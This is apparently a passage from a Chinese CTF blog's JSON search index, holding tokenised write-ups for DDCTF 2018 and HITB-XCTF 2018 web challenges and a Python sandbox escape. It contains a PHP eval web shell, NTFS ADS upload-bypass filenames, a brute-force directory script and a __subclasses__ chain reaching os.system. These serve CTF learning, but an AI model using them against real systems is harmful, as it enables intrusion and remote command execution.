\" } ,   method = { org . springframework . web . bind . annotation . RequestMethod . POST } )   public   String   getFlag ( @ PathVariable ( \" email \" )   String   email ,   ModelMap   model )   {   Flag   flag   =   flagService . getFlagByEmail ( email ) ;   return   \" Encrypted   flag   :   \"   +   flag . getFlag ( ) ;   }   \u4ee5 \u7528\u6237 \u7684 \u90ae\u7bb1 \u6765 \u83b7\u53d6 \u52a0\u5bc6 \u7684 flag \uff0c \u90ae\u7bb1 \u5c31\u662f \u9996\u9875 \u4e0a \u7684 \u90ae\u7bb1 \uff0c \u7136\u540e \u901a\u8fc7 listener . java \u5f97\u5230 \u5177\u4f53 \u7684 \u52a0\u5bc6 \u8fc7\u7a0b   String   flag   =   \" DDCTF { \"   +   Math . abs ( sr . nextLong ( ) )   +   \" } \" ;   String   uuid   =   UUID . randomUUID ( ) . toString ( ) . replace ( \" - \" ,   \" s \" ) ;   byte [ ]   data   =   cipher . doFinal ( flag . getBytes ( ) ) ;   byte [ ]   e   =   mac . doFinal ( String . valueOf ( email . trim ( ) ) . getBytes ( ) ) ;   Flag   flago   =   new   Flag ( ) ;   flago . setId ( Integer . valueOf ( id ) ) ;   flago . setFlag ( byte2hex ( data ) ) ;   flago . setEmail ( byte2hex ( e ) ) ;   flago . setOriginFlag ( flag ) ;   flago . setUuid ( uuid ) ;   flago . setOriginEmail ( email ) ;   \u53ef\u4ee5 \u770b\u5230 Email \u88ab \u8f6c\u5316 \u4e3a 16 \u8fdb\u5236 \u7684 \u5f62\u5f0f \uff0c \u6240\u4ee5 \u9700\u8981 \u5148\u5bf9 \u90ae\u7bb1 \u505a \u5904\u7406 \uff0c \u7b80\u5355 \u7f16\u5199 \u4ee3\u7801 \uff08 \u540e\u9762 \u653e\u4e0a \u4e0a\u6765 \u653e\u4e0a\u6765 \uff09 \uff0c \u5f97\u5230 8EF662D0406A099B394DC817AB391718DD7BF29CCC1AAF32A7D7AB23C845CA27 \uff0c \u4ee5   http : / / 116.85 . 48.102 : 5050 / flag / getflag / 8EF662D0406A099B394DC817AB391718DD7BF29CCC1AAF32A7D7AB23C845CA27   \u8bf7\u6c42 \u540e \u5f97\u5230 \u52a0\u5bc6 \u7684 flag \u3002","title":"step   3 :"},{"location":"writeups/2018/ddctf-web-writeup-20180421/#step-4_1","text":"\u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u5c31\u662f \u5199 \u4ee3\u7801 \u89e3\u5bc6 flag \u4e86 \uff0c \u56e0\u4e3a \u5bc6\u94a5 \u6587\u4ef6 \u5728\u624b \uff0c \u53ea \u9700 \u7f16\u5199 \u7a0b\u5e8f \u7f16\u5199\u7a0b\u5e8f \u5373\u53ef \uff0c \u53c2\u8003 https : / / stackoverflow . com / questions / 39518979 / basic - program - for - encrypt - decrypt - javax - crypto - badpaddingexception - decryption ? utm _ medium = organic & utm _ source = google _ rich _ qa & utm _ campaign = google _ rich _ qa   \u9700\u8981 \u6ce8\u610f \u7684 \u662f \u8fd9\u91cc \u7528 \u4e86 \u79c1\u94a5 \u52a0\u5bc6 \u516c\u94a5 \u89e3\u5bc6 \u3002   \u89e3\u5bc6 \u540e \u5f97\u5230 flag","title":"step   4 :"},{"location":"writeups/2018/hitb-xctf-2018-portion-web-writeup-20180415/","tags":["ctf"],"text":"upload   \u8003\u70b9   windows \u5e73\u53f0 \u7684 \u4e00\u4e9b \u7279\u6027   -   windows \u5e73\u53f0 \u7279\u6027   windows \u4e0b \u641c\u7d22 \u6587\u4ef6 \u7528\u5230 \u7684 \u662f FindFirstFile \uff0c \u8be5 \u51fd\u6570 \u6267\u884c \u65f6 \uff0c \u4f1a \u5c06   \" < \"   = >   \" * \"   \u3001   \" > \"   = >   \" ? \"   \u3001   \"   = >   .   \uff0c \u6240\u4ee5 \u5728 \u5e94\u7528 \u4e2d \uff0c \u6211\u4eec \u53ef\u4ee5 \u4f7f\u7528 \u8fd9\u4e2a \u7279\u6027 \u3002 e . g .   ? filename = a >   = >   a ?   \u5339\u914d \u5355\u4e2a \u5b57\u7b26   ? filename = a <   = >   a *   \u5339\u914d \u591a\u4e2a \u5b57\u7b26   ? filename = a \"   = >   a .   NTFS   ADS \u7279\u6027   \u4e0a\u4f20 \u7684 \u6587\u4ef6 \u6587\u4ef6\u540d   \u7cfb\u7edf \u7ed3\u679c   test . php : a . jpg   \u751f\u6210 test . php \uff0c \u4f46\u662f \u65e0 \u5185\u5bb9   test . php : : $ DATA   \u751f\u6210 test . php \uff0c \u6709 \u5185\u5bb9   test . php : : $ INDEX _ ALLOCATION   \u751f\u6210 test . php \u6587\u4ef6 \u4ef6\u5939 \u6587\u4ef6\u5939   test . php : : $ DATA . jpg   \u751f\u6210 0 . jpg \uff0c \u6709 \u5185\u5bb9   test . php : : $ DATA \\ test . jpg   \u751f\u6210 aaa . jpg \uff0c \u6709 \u5185\u5bb9   \u8fc7\u7a0b   step   1 :   \u529f\u80fd \u70b9 # \u6587\u4ef6 \u4e0a\u4f20   # \u4e0a\u4f20 \u6587\u4ef6 \u5bbd\u9ad8   = >   getshell   \u73af\u5883 \uff1a IIS7.0   Windows   Server   2008   Standard   Edition   Service   Pack   2   step   2 :   \u6587\u4ef6 \u4e0a\u4f20 \u529f\u80fd \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 php \uff0c \u6587\u4ef6 \u6587\u4ef6\u540d \u524d\u7f00 \u65f6\u95f4 \u6233 \u91cd\u5199 \uff0c \u4f46 \u622a\u53d6 \u4e0a\u4f20 \u6587\u4ef6 \u6587\u4ef6\u540d \u7684 \u6700\u540e \u4e00\u4e2a \u540e\u7f00 \u4e0d\u53d8 \u3002 \u7b80\u5355 \u5229\u7528 ADS \u7279\u6027 \uff0c \u4e0a\u4f20 test . php : : $ DATA   step   3 :   \u4e0a\u4f20 \u4e86 \u6587\u4ef6 \u540e \uff0c \u9700\u8981 \u627e\u5230 \u6587\u4ef6 \u76ee\u5f55 \u6587\u4ef6\u76ee\u5f55 \u3002 pic . php \u8fd4\u56de \u4e86 \u4e0a\u4f20 \u6587\u4ef6 \u5bbd \u548c \u9ad8 \uff0c \u731c\u6d4b \u5176 \u4f7f\u7528 \u4e86 getimagesize \uff0c \u60f3\u5230 \u524d\u6bb5 \u65f6\u95f4 \u6bb5\u65f6\u95f4 \u524d\u6bb5\u65f6\u95f4 \u7684 \u4e00\u7bc7   \u5e16\u5b50   \uff0c \u5199\u4e2a \u811a\u672c \u8dd1 \u8be5 \u590d\u6742 \u76ee\u5f55   # ! / usr / bin / env   python   #   - * -   coding :   utf - 8   - * -   #   Created   by   wh1t3P1g   at   2018 / 4 / 11   import   requests   str = \" 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ \"   ret = \" \"   for   i   in   range ( 32 ) :   for   c   in   str :   t = ret + c   url = \" http : / / 47.90 . 97.18 : 9999 / pic . php ? filename = .. / \" + t + \" % 3C / 1523456340 . jpg \"   r = requests . get ( url )   if   \" width \"   in   r . content :   ret + = c   print   ret   break   \u5f97\u5230 \u76ee\u5f55 87194f13726af7cee27ba2cfe97b60df   step   4 :   \u6709 \u4e86 \u76ee\u5f55 \u5c31 \u80fd \u8bbf\u95ee \u4e0a\u4f20 \u7684 \u4e00\u53e5 \u8bdd   < ? php   eval ( $ _ POST [ cmd ] ) ; ? >   \uff0c \u7cfb\u7edf \u7981\u7528 \u4e86 \u6267\u884c \u7cfb\u7edf \u547d\u4ee4 \u7cfb\u7edf\u547d\u4ee4 \u7684 \u4e00\u4e9b \u51fd\u6570 \uff0c \u4f46\u662f \u8fd9\u91cc \u9700\u8981 \u5e76\u4e0d\u9700\u8981 \u6267\u884c \u547d\u4ee4 \u6267\u884c\u547d\u4ee4 \u3002   \u8fd9\u91cc \u4e0d \u622a\u56fe \u4e86   cmd = var _ dump ( glob ( \" .. / * \" ) ) ;   \u5f97\u5230 flag . php \uff0c \u8bbf\u95ee \u540e \u53d1\u73b0 \u9700\u8981 \u8bfb\u53d6 flag . php \u7684 \u5185\u5bb9   cmd = echo   readfile ( \" .. / flag . php \" ) ;   \u5f97\u5230 flag   \u603b\u7ed3   \u8fd9\u6b21 \u5c31 \u505a \u4e86 \u4e00\u9053 web \uff0c \u8fd8\u6709 \u5f85 \u63d0\u9ad8 \u548c \u79ef\u7d2f : )","title":"HITB - XCTF   2018   web   writeup"},{"location":"writeups/2018/hitb-xctf-2018-portion-web-writeup-20180415/#upload","text":"","title":"upload"},{"location":"writeups/2018/hitb-xctf-2018-portion-web-writeup-20180415/#_1","text":"windows \u5e73\u53f0 \u7684 \u4e00\u4e9b \u7279\u6027   -   windows \u5e73\u53f0 \u7279\u6027   windows \u4e0b \u641c\u7d22 \u6587\u4ef6 \u7528\u5230 \u7684 \u662f FindFirstFile \uff0c \u8be5 \u51fd\u6570 \u6267\u884c \u65f6 \uff0c \u4f1a \u5c06   \" < \"   = >   \" * \"   \u3001   \" > \"   = >   \" ? \"   \u3001   \"   = >   .   \uff0c \u6240\u4ee5 \u5728 \u5e94\u7528 \u4e2d \uff0c \u6211\u4eec \u53ef\u4ee5 \u4f7f\u7528 \u8fd9\u4e2a \u7279\u6027 \u3002 e . g .   ? filename = a >   = >   a ?   \u5339\u914d \u5355\u4e2a \u5b57\u7b26   ? filename = a <   = >   a *   \u5339\u914d \u591a\u4e2a \u5b57\u7b26   ? filename = a \"   = >   a .   NTFS   ADS \u7279\u6027   \u4e0a\u4f20 \u7684 \u6587\u4ef6 \u6587\u4ef6\u540d   \u7cfb\u7edf \u7ed3\u679c   test . php : a . jpg   \u751f\u6210 test . php \uff0c \u4f46\u662f \u65e0 \u5185\u5bb9   test . php : : $ DATA   \u751f\u6210 test . php \uff0c \u6709 \u5185\u5bb9   test . php : : $ INDEX _ ALLOCATION   \u751f\u6210 test . php \u6587\u4ef6 \u4ef6\u5939 \u6587\u4ef6\u5939   test . php : : $ DATA . jpg   \u751f\u6210 0 . jpg \uff0c \u6709 \u5185\u5bb9   test . php : : $ DATA \\ test . jpg   \u751f\u6210 aaa . jpg \uff0c \u6709 \u5185\u5bb9","title":"\u8003\u70b9"},{"location":"writeups/2018/hitb-xctf-2018-portion-web-writeup-20180415/#_2","text":"step   1 :   \u529f\u80fd \u70b9 # \u6587\u4ef6 \u4e0a\u4f20   # \u4e0a\u4f20 \u6587\u4ef6 \u5bbd\u9ad8   = >   getshell   \u73af\u5883 \uff1a IIS7.0   Windows   Server   2008   Standard   Edition   Service   Pack   2   step   2 :   \u6587\u4ef6 \u4e0a\u4f20 \u529f\u80fd \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 php \uff0c \u6587\u4ef6 \u6587\u4ef6\u540d \u524d\u7f00 \u65f6\u95f4 \u6233 \u91cd\u5199 \uff0c \u4f46 \u622a\u53d6 \u4e0a\u4f20 \u6587\u4ef6 \u6587\u4ef6\u540d \u7684 \u6700\u540e \u4e00\u4e2a \u540e\u7f00 \u4e0d\u53d8 \u3002 \u7b80\u5355 \u5229\u7528 ADS \u7279\u6027 \uff0c \u4e0a\u4f20 test . php : : $ DATA   step   3 :   \u4e0a\u4f20 \u4e86 \u6587\u4ef6 \u540e \uff0c \u9700\u8981 \u627e\u5230 \u6587\u4ef6 \u76ee\u5f55 \u6587\u4ef6\u76ee\u5f55 \u3002 pic . php \u8fd4\u56de \u4e86 \u4e0a\u4f20 \u6587\u4ef6 \u5bbd \u548c \u9ad8 \uff0c \u731c\u6d4b \u5176 \u4f7f\u7528 \u4e86 getimagesize \uff0c \u60f3\u5230 \u524d\u6bb5 \u65f6\u95f4 \u6bb5\u65f6\u95f4 \u524d\u6bb5\u65f6\u95f4 \u7684 \u4e00\u7bc7   \u5e16\u5b50   \uff0c \u5199\u4e2a \u811a\u672c \u8dd1 \u8be5 \u590d\u6742 \u76ee\u5f55   # ! / usr / bin / env   python   #   - * -   coding :   utf - 8   - * -   #   Created   by   wh1t3P1g   at   2018 / 4 / 11   import   requests   str = \" 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ \"   ret = \" \"   for   i   in   range ( 32 ) :   for   c   in   str :   t = ret + c   url = \" http : / / 47.90 . 97.18 : 9999 / pic . php ? filename = .. / \" + t + \" % 3C / 1523456340 . jpg \"   r = requests . get ( url )   if   \" width \"   in   r . content :   ret + = c   print   ret   break   \u5f97\u5230 \u76ee\u5f55 87194f13726af7cee27ba2cfe97b60df   step   4 :   \u6709 \u4e86 \u76ee\u5f55 \u5c31 \u80fd \u8bbf\u95ee \u4e0a\u4f20 \u7684 \u4e00\u53e5 \u8bdd   < ? php   eval ( $ _ POST [ cmd ] ) ; ? >   \uff0c \u7cfb\u7edf \u7981\u7528 \u4e86 \u6267\u884c \u7cfb\u7edf \u547d\u4ee4 \u7cfb\u7edf\u547d\u4ee4 \u7684 \u4e00\u4e9b \u51fd\u6570 \uff0c \u4f46\u662f \u8fd9\u91cc \u9700\u8981 \u5e76\u4e0d\u9700\u8981 \u6267\u884c \u547d\u4ee4 \u6267\u884c\u547d\u4ee4 \u3002   \u8fd9\u91cc \u4e0d \u622a\u56fe \u4e86   cmd = var _ dump ( glob ( \" .. / * \" ) ) ;   \u5f97\u5230 flag . php \uff0c \u8bbf\u95ee \u540e \u53d1\u73b0 \u9700\u8981 \u8bfb\u53d6 flag . php \u7684 \u5185\u5bb9   cmd = echo   readfile ( \" .. / flag . php \" ) ;   \u5f97\u5230 flag","title":"\u8fc7\u7a0b"},{"location":"writeups/2018/hitb-xctf-2018-portion-web-writeup-20180415/#_3","text":"\u8fd9\u6b21 \u5c31 \u505a \u4e86 \u4e00\u9053 web \uff0c \u8fd8\u6709 \u5f85 \u63d0\u9ad8 \u548c \u79ef\u7d2f : )","title":"\u603b\u7ed3"},{"location":"writeups/2018/old-python-sandbox-escape/","tags":["ctf"],"text":"\u6982\u8ff0   \u524d \u51e0\u5929 \u7684 \u534e\u5c71 \u676f\u51fa \u4e86 \u4e00\u9053 python \u7684 \u6c99\u76d2 \u9003\u9038 \uff0c \u611f\u89c9 \u633a \u6709\u610f \u610f\u601d \u6709\u610f\u601d \u7684 \u3002 \u5728 \u7f51\u4e0a \u641c\u7d22 \u4e86 \u4e00\u4e0b \uff0c \u53d1\u73b0 \u5f88 \u65e9\u5c31 \u51fa\u8fc7 \u8fd9\u79cd \u7c7b\u578b \u7684 \u9898 \uff0c \u6e90\u7801 \u90fd \u4e0d\u591a \u5dee\u4e0d\u591a \u3002 \u5b66\u4e60 \u4e86 \u4e00\u4e0b \u601d\u8def \uff0c \u8fd9\u91cc \u603b\u7ed3 \u4e00\u4e0b \uff1a \uff09   \u4ecb\u7ecd   \u6c99\u76d2 \u6e90\u7801 \u5982\u4e0b \uff1a   # ! / usr / bin / env   python   from   __ future __   import   print _ function   print   (   \" Welcome   to   my   Python   sandbox !   Enter   commands   below ! \"   )   banned   =   [   \" import \"   ,   \" exec \"   ,   \" eval \"   ,   \" pickle \"   ,   \" os \"   ,   \" subprocess \"   ,   \" kevin   sucks \"   ,   \" input \"   ,   \" banned \"   ,   \" cry   sum   more \"   ,   \" sys \"   ]   targets   =   __ builtins __   .   __ dict __   .   keys   ( )   targets   .   remove   (   ' raw _ input '   )   targets   .   remove   (   ' print '   )   for   x   in   targets   :   #   \u53bb\u9664 \u6240\u6709 \u5185\u7f6e \u51fd\u6570 \u9664 print   raw _ input   del   __ builtins __   .   __ dict __   [   x   ]   while   1   :   print   (   \" > > > \"   ,   end   =   '   '   )   data   =   raw _ input   ( )   for   no   in   banned   :   if   no   .   lower   ( )   in   data   .   lower   ( ) :   print   (   \" No   bueno \"   )   break   else   :   #   this   means   nobreak   exec   data   \u4e0d\u80fd \u51fa\u73b0 banned \u5217\u8868 \u4e2d \u7684 \u5b57\u7b26 \uff0c \u4f46\u662f \u9700\u8981 \u8bfb\u53d6 flag \u6587\u4ef6 \u5185\u5bb9 \u3002   \u539f\u7406   \u7ed5\u8fc7 \u524d\u9762 \u7684 \u9650\u5236 \uff0c \u6211\u4eec \u6765 \u4e00\u6b65 \u4e00\u6b65 \u770b payload   \u65b9\u6cd5 \u4e00   > > >   [ ] .__ class __   < type   ' list ' >   > > >   { } .__ class __   < type   ' dict ' >   > > >   ( ) .__ class __   < type   ' tuple ' >   \u9996\u5148 python \u7684 \u5185\u7f6e \u5bf9\u8c61 \u6709 \u4e00\u4e2a __ class __ \u5c5e\u6027 \u6765 \u5b58\u50a8 \u7c7b\u578b \uff0c \u6211\u4eec \u5f80\u4e0a \u627e \u4ed6 \u7684 \u7236\u7c7b \u4f7f\u7528 __ base __ \u5c5e\u6027   > > >   { } .__ class __.__ base __   < type   ' object ' >   > > >   ( ) .__ class __.__ base __   < type   ' object ' >   > > >   [ ] .__ class __.__ base __   < type   ' object ' >   \u53ef\u4ee5 \u770b\u5230 \u8fd4\u56de object \u5bf9\u8c61 \uff0c \u56e0\u4e3a python \u4e2d \u4e00\u5207 \u5747 \u4e3a \u5bf9\u8c61 \uff0c \u5747 \u7ee7\u627f object \u5bf9\u8c61 \uff0c \u5f97\u5230 object \u4e4b\u540e \u6211\u4eec \u5c31 \u53ef \u5728 \u901a\u8fc7 \u5c5e\u6027 __ subclasses __ \u6765 \u67e5\u770b object \u7684 \u5b50\u7c7b \uff08 \u5305\u62ec \u6240\u6709 \u7684 \u5185\u7f6e \u7c7b \uff09   > > >   [ ] .__ class __.__ base __.__ subclasses __ ( )   [ < type   ' type ' > ,   < type   ' weakref ' > ,   < type   ' weakcallableproxy ' > ,   < type   ' weakproxy ' > ,   < type   ' int ' > ,   < type   ' basestring ' > ,   < type   ' bytearray ' > ,   < type   ' list ' > ,   < type   ' NoneType ' > ,   < type   ' NotImplementedType ' > ,   < type   ' traceback ' > ,   < type   ' super ' > ,   < type   ' xrange ' > ,   < type   ' dict ' > ,   < type   ' set ' > ,   < type   ' slice ' > ,   < type   ' staticmethod ' > ,   < type   ' complex ' > ,   < type   ' float ' > ,   < type   ' buffer ' > ,   < type   ' long ' > ,   < type   ' frozenset ' > ,   < type   ' property ' > ,   < type   ' memoryview ' > ,   < type   ' tuple ' > ,   < type   ' enumerate ' > ,   < type   ' reversed ' > ,   < type   ' code ' > ,   < type   ' frame ' > ,   < type   ' builtin _ function _ or _ method ' > ,   < type   ' instancemethod ' > ,   < type   ' function ' > ,   < type   ' classobj ' > ,   < type   ' dictproxy ' > ,   < type   ' generator ' > ,   < type   ' getset _ descriptor ' > ,   < type   ' wrapper _ descriptor ' > ,   < type   ' instance ' > ,   < type   ' ellipsis ' > ,   < type   ' member _ descriptor ' > ,   < type   ' file ' > ,   < type   ' PyCapsule ' > ,   < type   ' cell ' > ,   < type   ' callable - iterator ' > ,   < type   ' iterator ' > ,   < type   ' sys . long _ info ' > ,   < type   ' sys . float _ info ' > ,   < type   ' EncodingMap ' > ,   < type   ' fieldnameiterator ' > ,   < type   ' formatteriterator ' > ,   < type   ' sys . version _ info ' > ,   < type   ' sys . flags ' > ,   < type   ' exceptions . BaseException ' > ,   < type   ' module ' > ,   < type   ' imp . NullImporter ' > ,   < type   ' zipimport . zipimporter ' > ,   < type   ' posix . stat _ result ' > ,   < type   ' posix . statvfs _ result ' > ,   < class   ' warnings . WarningMessage ' > ,   < class   ' warnings . catch _ warnings ' > ,   < class   ' _ weakrefset ._ IterationGuard ' > ,   < class   ' _ weakrefset . WeakSet ' > ,   < class   ' _ abcoll . Hashable ' > ,   < type   ' classmethod ' > ,   < class   ' _ abcoll . Iterable ' > ,   < class   ' _ abcoll . Sized ' > ,   < class   ' _ abcoll . Container ' > ,   < class   ' _ abcoll . Callable ' > ,   < type   ' dict _ keys ' > ,   < type   ' dict _ items ' > ,   < type   ' dict _ values ' > ,   < class   ' site ._ Printer ' > ,   < class   ' site ._ Helper ' > ,   < type   ' _ sre . SRE _ Pattern ' > ,   < type   ' _ sre . SRE _ Match ' > ,   < type   ' _ sre . SRE _ Scanner ' > ,   < class   ' site . Quitter ' > ,   < class   ' codecs . IncrementalEncoder ' > ,   < class   ' codecs . IncrementalDecoder ' > ]   \u56de\u5230 \u6211\u4eec \u7684 \u4e3b\u8981 \u76ee\u7684 \u4e0a \uff0c \u6211\u4eec \u9700\u8981 \u8bfb\u53d6 flag \u6587\u4ef6 \u4e2d \u7684 \u5185\u5bb9 \uff0c \u5728 \u8fd9\u4e9b \u5b50\u7c7b \u4e2d\u6709 \u54ea\u4e9b \u662f \u53ef\u4ee5 \u7528\u6765 \u8bfb\u53d6 \u6587\u4ef6 \u5185\u5bb9 \u7684 \u5462 \uff1f \u7b54\u6848 \u662f file \u5b50\u7c7b \uff0c \u9996\u5148 \u67e5\u627e \u4e00\u4e0b file \u5b50\u7c7b \u7684 \u4f4d\u7f6e \u3002   > > >   [ ] .__ class __.__ base __.__ subclasses __ ( ) . index ( file )   40   \u8fd9\u6837 \u6211\u4eec \u5c31 \u53ef\u4ee5 \u901a\u8fc7 \u8fd9\u4e2a \u6765 \u5efa\u7acb \u4e00\u4e2a file \u7c7b \u7684 \u522b\u540d \u8bfb \u6587\u4ef6 \u5566 \uff1a \uff09   > > >   f = [ ] .__ class __.__ base __.__ subclasses __ ( ) [ 40 ]   > > >   f ( ' . / flag . txt ' ) . read ( )   \uff1f \uff1f \uff1f \u6ca1\u6709 \u4efb\u4f55 \u5185\u5bb9 \u6253\u5370 \u51fa\u6765 \uff0c \u4f46\u662f \u4ed6 \u6ca1\u6709 \u62a5\u9519 \u8bf4\u660e \u5b58\u5728 flag . txt \u6587\u4ef6 \uff0c \u6211\u4eec \u5c1d\u8bd5 \u7528 \u4ed6 \u7ed9 \u7684 print \u51fd\u6570 \u6765 \u6253\u5370   > > >   print ( f ( ' . / flag . txt ' ) . read ( ) )   This   is   a   Flag { enjoy _ yourself _ ctfer }   \u5f97\u5230 flag   \u65b9\u6cd5 \u4e8c   \u540c\u6837 \u7684 \u8fd8\u6709 \u4e00\u79cd \u65b9\u6cd5 \u5c31\u662f \u4f7f\u7528 os \u6a21\u5757 \u6765 \u6267\u884c \u7cfb\u7edf \u547d\u4ee4 \u7cfb\u7edf\u547d\u4ee4 system \uff0c \u4f46\u662f os \u88ab \u5c4f\u853d   > > >   import   os   No   bueno   \u6211\u4eec \u5f97 \u60f3 \u5176\u4ed6 \u529e\u6cd5 \u6765 \u83b7\u53d6 shell \u3002 \u901a\u8fc7 \u4e0a\u9762 \u7684 \u601d\u8def \uff0c \u6211\u4eec \u9700\u8981 \u627e \u4e00\u4e2a \u5b50\u7c7b \u4ed6 \u80fd \u8c03\u7528 os \u6a21\u5757 \uff0c \u8fd9\u91cc \u7528\u5230 \u4e86   warnings . catch _ warnings   \u7c7b   > > >   import   warnings   > > >   [ ] .__ class __.__ base __.__ subclasses __ ( ) . index ( warnings . catch _ warnings )   59   > > >   [ ] .__ class __.__ base __.__ subclasses __ ( ) [ 59 ]   < class   ' warnings . catch _ warnings ' >   > > >   [ ] .__ class __.__ base __.__ subclasses __ ( ) [ 59 ] .__ init __. func _ globals . keys ( )   [ ' filterwarnings ' ,   ' once _ registry ' ,   ' WarningMessage ' ,   ' _ show _ warning ' ,   ' filters ' ,   ' _ setoption ' ,   ' showwarning ' ,   ' __ all __ ' ,   ' onceregistry ' ,   ' __ package __ ' ,   ' simplefilter ' ,   ' default _ action ' ,   ' _ getcategory ' ,   ' __ builtins __ ' ,   ' catch _ warnings ' ,   ' __ file __ ' ,   ' warnpy3k ' ,   ' sys ' ,   ' __ name __ ' ,   ' warn _ explicit ' ,   ' types ' ,   ' warn ' ,   ' _ processoptions ' ,   ' defaultaction ' ,   ' __ doc __ ' ,   ' linecache ' ,   ' _ OptionError ' ,   ' resetwarnings ' ,   ' formatwarning ' ,   ' _ getaction ' ]   \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u518d \u627e   linecache   > > >   [ ] .__ class __.__ base __.__ subclasses __ ( ) [ 59 ] .__ init __. func _ globals . keys ( ) . index ( ' linecache ' )   25   > > >   [ ] .__ class __.__ base __.__ subclasses __ ( ) [ 59 ] .__ init __. func _ globals [ ' linecache ' ] .__ dict __. keys ( )   [ ' updatecache ' ,   ' clearcache ' ,   ' __ all __ ' ,   ' __ builtins __ ' ,   ' __ file __ ' ,   ' cache ' ,   ' checkcache ' ,   ' getline ' ,   ' __ package __ ' ,   ' sys ' ,   ' getlines ' ,   ' __ name __ ' ,   ' os ' ,   ' __ doc __ ' ]   \u53ef\u4ee5 \u770b\u5230 \u8fd9\u91cc \u53ef\u4ee5 \u8c03\u7528 os \u6a21\u5757 \uff0c \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u5c31 \u8c03\u7528 system \u51fd\u6570 \u4e86   > > >   [ ] .__ class __.__ base __.__ subclasses __ ( ) [ 59 ] .__ init __. func _ globals [ ' linecache ' ] .__ dict __. values ( ) [ 12 ]   < module   ' os '   from   ' / usr / lib / python2.7 / os . pyc ' >   > > >   [ ] .__ class __.__ base __.__ subclasses __ ( ) [ 59 ] .__ init __. func _ globals [ ' linecache ' ] .__ dict __. values ( ) [ 12 ] .__ dict __. keys ( ) . index ( ' system ' )   144   \u6574\u7406 \u4e00\u4e0b   > > >   a = [ ] .__ class __.__ base __.__ subclasses __ ( ) [ 59 ] .__ init __. func _ globals [ ' linecache ' ] .__ dict __. values ( ) [ 12 ]   > > >   a   < module   ' os '   from   ' / usr / lib / python2.7 / os . pyc ' >   > > >   s = a .__ dict __. keys ( ) . index ( ' system ' )   > > >   s   144   > > >   s = a .__ dict __. keys ( ) [ 144 ]   > > >   s   ' system '   > > >   s = a .__ dict __. values ( ) [ 144 ]   > > >   s ( ' pwd ' )   / home / xxxx / Desktop / code / python - code / test   \u597d \u4e86 \u73b0\u5728 \u53ef\u4ee5 \u6267\u884c \u7cfb\u7edf \u547d\u4ee4 \u7cfb\u7edf\u547d\u4ee4 \u4e86 \uff0c cat \u4e00\u4e0b flag   > > >   s ( ' cat   flag . txt ' )   This   is   a   Flag { enjoy _ yourself _ ctfer }   \u603b\u7ed3   \u901a\u8fc7 \u4e0a\u9762 \u7684 python \u6c99\u76d2 \u9003\u9038 \uff0c \u53d1\u73b0 \u8bfb python \u5b98\u7f51 \u624b\u518c \u8fd8\u662f \u5f88 \u6709 \u5fc5\u8981 \u7684 \uff0c \u627e\u4e2a \u65f6\u95f4 \u4e00\u70b9 \u4e00\u70b9 \u4e00\u70b9\u4e00\u70b9 \u770b \uff1a \uff09 \u5171\u52c9   \u53c2\u8003   https : / / hexplo . it / escaping - the - csawctf - python - sandbox /","title":"python   sandbox   escape"},{"location":"writeups/2018/old-python-sandbox-escape/#_1","text":"\u524d \u51e0\u5929 \u7684 \u534e\u5c71 \u676f\u51fa \u4e86 \u4e00\u9053 python \u7684 \u6c99\u76d2 \u9003\u9038 \uff0c \u611f\u89c9 \u633a \u6709\u610f \u610f\u601d \u6709\u610f\u601d \u7684 \u3002 \u5728 \u7f51\u4e0a \u641c\u7d22 \u4e86 \u4e00\u4e0b \uff0c \u53d1\u73b0 \u5f88 \u65e9\u5c31 \u51fa\u8fc7 \u8fd9\u79cd \u7c7b\u578b \u7684 \u9898 \uff0c \u6e90\u7801 \u90fd \u4e0d\u591a \u5dee\u4e0d\u591a \u3002 \u5b66\u4e60 \u4e86 \u4e00\u4e0b \u601d\u8def \uff0c \u8fd9\u91cc \u603b\u7ed3 \u4e00\u4e0b \uff1a \uff09","title":"\u6982\u8ff0"},{"location":"writeups/2018/old-python-sandbox-escape/#_2","text":"\u6c99\u76d2 \u6e90\u7801 \u5982\u4e0b \uff1a   # ! / usr / bin / env   python   from   __ future __   import   print _ function   print   (   \" Welcome   to   my   Python   sandbox !   Enter   commands   below ! \"   )   banned   =   [   \" import \"   ,   \" exec \"   ,   \" eval \"   ,   \" pickle \"   ,   \" os \"   ,   \" subprocess \"   ,   \" kevin   sucks \"   ,   \" input \"   ,   \" banned \"   ,   \" cry   sum   more \"   ,   \" sys \"   ]   targets   =   __ builtins __   .   __ dict __   .   keys   ( )   targets   .   remove   (   ' raw _ input '   )   targets   .   remove   (   ' print '   )   for   x   in   targets   :   #   \u53bb\u9664 \u6240\u6709 \u5185\u7f6e \u51fd\u6570 \u9664 print   raw _ input   del   __ builtins __   .   __ dict __   [   x   ]   while   1   :   print   (   \" > > > \"   ,   end   =   '   '   )   data   =   raw _ input   ( )   for   no   in   banned   :   if   no   .   lower   ( )   in   data   .   lower   ( ) :   print   (   \" No   bueno \"   )   break   else   :   #   this   means   nobreak   exec   data   \u4e0d\u80fd \u51fa\u73b0 banned \u5217\u8868 \u4e2d \u7684 \u5b57\u7b26 \uff0c \u4f46\u662f \u9700\u8981 \u8bfb\u53d6 flag \u6587\u4ef6 \u5185\u5bb9 \u3002","title":"\u4ecb\u7ecd"},{"location":"writeups/2018/old-python-sandbox-escape/#_3","text":"\u7ed5\u8fc7 \u524d\u9762 \u7684 \u9650\u5236 \uff0c \u6211\u4eec \u6765 \u4e00\u6b65 \u4e00\u6b65 \u770b payload","title":"\u539f\u7406"},{"location":"writeups/2018/old-python-sandbox-escape/#_4","text":"> > >   [ ] .__ class __   < type   ' list ' >   > > >   { } .__ class __   < type   ' dict ' >   > > >   ( ) .__ class __   < type   ' tuple ' >   \u9996\u5148 python \u7684 \u5185\u7f6e \u5bf9\u8c61 \u6709 \u4e00\u4e2a __ class __ \u5c5e\u6027 \u6765 \u5b58\u50a8 \u7c7b\u578b \uff0c \u6211\u4eec \u5f80\u4e0a \u627e \u4ed6 \u7684 \u7236\u7c7b \u4f7f\u7528 __ base __ \u5c5e\u6027   > > >   { } .__ class __.__ base __   < type   ' object ' >   > > >   ( ) .__ class __.__ base __   < type   ' object ' >   > > >   [ 